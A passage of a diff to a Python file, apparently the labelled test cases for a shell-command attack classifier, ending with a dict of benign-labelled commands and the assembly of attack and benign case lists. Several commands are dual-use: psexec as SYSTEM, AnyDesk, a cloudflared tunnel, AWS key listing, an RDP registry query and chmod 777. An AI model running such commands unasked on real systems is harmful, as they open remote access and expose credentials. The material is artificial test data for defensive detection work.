+        "kubectl-secret-create": r"kubectl create secret generic db --from-literal=password=changeme",
+        "aws-list-keys": r"aws iam list-access-keys --user-name alice",
+        "rdp-query": r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections',
+        "tee-log": r"make 2>&1 | tee build.log",
+        "source-venv": r". venv/bin/activate",
+        "cd-tmp-ls": r"cd /tmp && ls -la",
+        "chmod-777-dir": r"chmod 777 /srv/uploads",
+        "psexec-local": r"psexec -s -i regedit.exe",
+        "anydesk-run": r'"C:\Program Files (x86)\AnyDesk\AnyDesk.exe"',
+        "net-stop-app": r'net stop "MyApp Service"',
+        "sc-config-app": r"sc config MyAppSvc start= auto",
+        "cloudflared-http": r"cloudflared tunnel --url http://localhost:3000",
+    }
+    return _field("f2", attacks, benign)
+
+
+_F1A, _F1B = _field_round1()
+_F2A, _F2B = _field_round2()
+FIELD_ATTACKS: list[Case] = [*_F1A, *_F2A]
+FIELD_BENIGN: list[Case] = [*_F1B, *_F2B]
